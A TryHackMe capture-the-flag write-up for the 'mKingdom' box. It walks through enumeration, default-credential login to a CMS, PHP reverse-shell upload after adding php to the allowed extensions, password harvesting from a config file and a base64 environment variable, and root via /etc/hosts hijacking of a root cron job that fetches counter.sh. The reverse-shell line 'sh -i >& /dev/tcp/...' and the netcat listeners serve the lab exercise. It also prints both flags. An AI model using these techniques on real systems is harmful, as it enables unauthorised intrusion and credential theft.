# mKingdom tryhckme writeup
Beginner-friendly box inspired by a certain mustache man.




Initial enumeration

starting with nmap scan to check running port and services

```
death@esther:~$  nmap -sV 10.48.134.165
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-03 20:52 IST
Nmap scan report for 10.48.134.165
Host is up (0.028s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds

```

we can see website is runnning on port 85 strange 

## Web enumeration

let nevigate to website 

<img width="859" height="824" alt="image" src="https://github.com/user-attachments/assets/3acb218c-7c78-44c7-b6a0-dcc9324df4e3" />

i didnt find anything suspicious here so 
let make a directore enumeration
```
death@esther:~$ dirsearch -u 10.48.134.165:85
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/_10.48.134.165_85/_26-06-03_20-52-19.txt

Target: http://10.48.134.165:85/

[20:52:19] Starting: 
[20:52:22] 403 -  291B  - /.ht_wsr.txt
[20:52:22] 403 -  294B  - /.htaccess.bak1
[20:52:22] 403 -  294B  - /.htaccess.orig
[20:52:22] 403 -  296B  - /.htaccess.sample
[20:52:22] 403 -  294B  - /.htaccess.save
[20:52:22] 403 -  295B  - /.htaccess_extra
[20:52:22] 403 -  285B  - /.html
[20:52:22] 403 -  293B  - /.htaccessOLD2
[20:52:22] 403 -  284B  - /.htm
[20:52:22] 403 -  292B  - /.htaccessBAK
[20:52:22] 403 -  294B  - /.htaccess_orig
[20:52:22] 403 -  292B  - /.htaccess_sc
[20:52:22] 403 -  292B  - /.htaccessOLD
[20:52:22] 403 -  291B  - /.httr-oauth
[20:52:22] 403 -  290B  - /.htpasswds
[20:52:22] 403 -  294B  - /.htpasswd_test
[20:52:23] 403 -  284B  - /.php
[20:52:23] 403 -  285B  - /.php3
[20:52:31] 301 -  314B  - /app  ->  http://10.48.134.165:85/app/
[20:52:31] 200 -  457B  - /app/
[20:52:50] 403 -  293B  - /server-status
[20:52:50] 403 -  294B  - /server-status/

Task Completed
```
We found an dir /app `http://10.49.157.182:85/app/`
let take  a look

<img width="1113" height="612" alt="image" src="https://github.com/user-attachments/assets/30ef65d5-1124-4eff-8709-d7c95d40eab3" />

click on jump button it redirect us on /castle were a cms is hosted

<img width="1920" height="1007" alt="image" src="https://github.com/user-attachments/assets/abac4fab-8a0d-46dc-b5be-a118501fa5a6" />


direct enumerating again
```
death@esther:~$ dirsearch -u 10.48.134.165:85/app/castle
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/_10.48.134.165_85/_app_castle_26-06-03_20-52-28.txt

Target: http://10.48.134.165:85/

[20:52:28] Starting: app/castle/
[20:52:42] 403 -  302B  - /app/castle/.ht_wsr.txt
[20:52:42] 403 -  305B  - /app/castle/.htaccess.bak1
[20:52:42] 403 -  305B  - /app/castle/.htaccess.orig
[20:52:42] 403 -  305B  - /app/castle/.htaccess.save
[20:52:42] 403 -  307B  - /app/castle/.htaccess.sample
[20:52:42] 403 -  306B  - /app/castle/.htaccess_extra
[20:52:42] 403 -  304B  - /app/castle/.htaccessOLD2
[20:52:42] 403 -  303B  - /app/castle/.htaccessBAK
[20:52:42] 403 -  305B  - /app/castle/.htaccess_orig
[20:52:42] 403 -  303B  - /app/castle/.htaccess_sc
[20:52:42] 403 -  303B  - /app/castle/.htaccessOLD
[20:52:42] 403 -  295B  - /app/castle/.htm
[20:52:42] 403 -  296B  - /app/castle/.html
[20:52:42] 403 -  305B  - /app/castle/.htpasswd_test
[20:52:42] 403 -  302B  - /app/castle/.httr-oauth
[20:52:42] 403 -  301B  - /app/castle/.htpasswds
[20:52:43] 403 -  295B  - /app/castle/.php
[20:52:43] 403 -  296B  - /app/castle/.php3
[20:52:51] 301 -  333B  - /app/castle/application  ->  http://10.48.134.165:85/app/castle/application/
[20:52:51] 200 -    0B  - /app/castle/application/
[20:52:54] 200 -    2KB - /app/castle/composer.json
[20:52:54] 200 -  270KB - /app/castle/composer.lock
[20:53:00] 301 -  444B  - /app/castle/index.php/login/  ->  http://10.48.134.165:85/app/castle/index.php/login
[20:53:10] 200 -  175B  - /app/castle/robots.txt
[20:53:15] 301 -  329B  - /app/castle/updates  ->  http://10.48.134.165:85/app/castle/updates/
```

we got a login page let try some combo

<img width="762" height="597" alt="image" src="https://github.com/user-attachments/assets/4bbb6b75-40c8-4ba6-90f7-156e08a07376" />

ohh we got it user:admin pass: password

<img width="1917" height="1015" alt="image" src="https://github.com/user-attachments/assets/abcfd3e8-a62b-438e-8433-ebd9b93c2fda" />

as i click on file we can see we can upload a file let try to upload php reverse shell

<img width="1863" height="866" alt="image" src="https://github.com/user-attachments/assets/03e9e36f-f343-4eba-a0e8-4c114e6e3e74" />


let git clone revshell as im using pentest moneky shell
```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cd php-reverse-shell
nano php-reverse-shell.php 
```
<img width="377" height="116" alt="image" src="https://github.com/user-attachments/assets/85c8d069-19ec-447d-85dc-8047de750dd5" />

Change ip as ur tun0 ip

open netcat in another terminal 
```
nc-lnvp 1234
```
now uplode the shell

<img width="749" height="633" alt="image" src="https://github.com/user-attachments/assets/938557ea-d3d2-49ac-828a-742503a99b17" />

so its says invalid extention

<img width="749" height="633" alt="image" src="https://github.com/user-attachments/assets/82235cbb-e453-4742-820e-6e01d5a991ed" />

mm we need to find a way to upload either chnage exention or identify allowed extention 

ok so there is `system & setting` option and in that file setting option and there are allowed extentions let add php at last so
```
, php
```

<img width="1919" height="1004" alt="image" src="https://github.com/user-attachments/assets/3922dcdc-fd59-4070-ba89-d5840ed80c47" />

Now let try to reupload

<img width="778" height="637" alt="image" src="https://github.com/user-attachments/assets/be4791e7-ad0d-4bae-83f3-67987563f114" />

its upload successfully let click on link and get the connection

we got the connection
```
death@esther:~$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.48.134.165 37668
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:53:15 up 34 min,  0 users,  load average: 0.01, 0.04, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/
```

Okay by exploring we got 2 user toad and mario we can access home diretcory 

<img width="572" height="188" alt="image" src="https://github.com/user-attachments/assets/94189dac-694c-4e8a-9eda-6d8a188ef915" />

so i move to search for config in config file i got this file it it wierd so let move continue
```
 cat counter.sh
cat counter.sh
#!/bin/bash
echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."
```
so after check whole directory i got this file `/var/www/html/app/castle/application/config` we got database.php file
```
cat /var/www/html/app/castle/application/config/database.php
```

we got pass for user toad
<img width="631" height="395" alt="image" src="https://github.com/user-attachments/assets/1c24cd04-9649-4bfa-a62c-c4733596262a" />

user toad
psss: toadisthebest

so i forgot to stable the shell as it refuse to switch user only posible with terminal so i quickly spawn python shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg
stty rows 38 columns 116
```
<img width="716" height="174" alt="image" src="https://github.com/user-attachments/assets/c9c33749-b83c-479d-8617-1f68b9a68021" />

at toad home i go this file smb.txt and it contain this

<img width="637" height="756" alt="image" src="https://github.com/user-attachments/assets/39e304b8-3fde-4b57-b687-05623b0894a6" />

as i check we cant run sudo and we still cant peak at mario home 
```
toad@mkingdom:~$ sudo -l
sudo -l
[sudo] password for toad: toadisthebest
             
Sorry, user toad may not run sudo on mkingdom.
toad@mkingdom:~$
toad@mkingdom:~$ ls /home/mar*
ls /home/mar*
ls: cannot open directory /home/mario: Permission denied
toad@mkingdom:~$ 
```
Lateral Movement to User Mario

checked env 
and got this base64 encoded token in it
<img width="953" height="569" alt="image" src="https://github.com/user-attachments/assets/8f4c8a46-204c-4276-8aaf-0324e6611dc1" />

```
death@esther:~$ echo "aWthVGVOVEFOdEVTCg=="| base64 -d
ikaTeNTANtES
death@esther:~$ 
```
as i decoded i think maybe this is pass of mario let try 
```
toad@mkingdom:~$ su mario
su mario
Password: ikaTeNTANtES

mario@mkingdom:/home/toad$
```
now we are mario

## User flag.txt

<img width="410" height="163" alt="image" src="https://github.com/user-attachments/assets/b814d1cb-5b6d-4754-b417-9306c4f73e15" />

we dont have perm to use cat cmd so we need to use head to view content of user.txt file
```
thm{030a769febb1b3291da1375234b84283}
```
Next I snoop around a bit with no luck of finding a way to escalate to root user.

So next try to upload pspy
```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

2. Start a server on your own machine using the command:
```
python3 -m http.server 4444
```
Now wget the file from your own machine to mkingdom’s machine:
```
wget http://'YOUR_MACHINE_IP':8000/Desktop/pspy64 -O /tmp/pspy64
```
let execute it 
```
cd /tmp
chmod +x pspy64
./pspy64
```
as i relogin on webite 
pspy64 got some 

<img width="1209" height="261" alt="image" src="https://github.com/user-attachments/assets/1cf2d373-f781-4743-9d1c-51e696c900da" />
that counter file is still running

Domain Hijacking for Root Access
Here the command curl mkingdom.thm:85/app/castle/application/counter.sh has uid of 0 so if we can highjack the domain mkingdom.thm then we can get root privilege.

Now to get the root privileges we can highjack the domain mkingdom.thm and to do that we need to edit the /etc/hosts file and change the ip address of mkingdom.thm domain to you own machine ip address in my case it is

<img width="599" height="335" alt="image" src="https://github.com/user-attachments/assets/5751aad3-f734-48aa-995e-5b05228f824b" />

as i added my tun0 ip let save it
Next, replicate the directory structure and place a malicious script:
```
mkdir -p app/castle/application
cd app/castle/application
nano counter.sh
```
add revshell code
```
sh -i >& /dev/tcp/<tun0 ip>/4444 0>&1
```
now start a python server at own system 
```
sudo python3 -m http.server 85
```
<img width="970" height="91" alt="image" src="https://github.com/user-attachments/assets/d913beea-6ab8-4e2a-8283-32a1620c0292" />

and start netcat at another terminal
```
nc -lnvp 4444
```
<img width="488" height="157" alt="image" src="https://github.com/user-attachments/assets/db82ab71-eeac-4564-94fd-3ec91761273d" />
and refresh the website

use head cat still cant use
<img width="424" height="271" alt="image" src="https://github.com/user-attachments/assets/c3345d9b-717e-4113-bbea-e5f83c814c46" />

thm{e8b2f52d88b9930503cc16ef48775df0}

<img width="1196" height="476" alt="image" src="https://github.com/user-attachments/assets/edf20c67-b7fb-4bf2-9c2f-78e55e4346ec" />



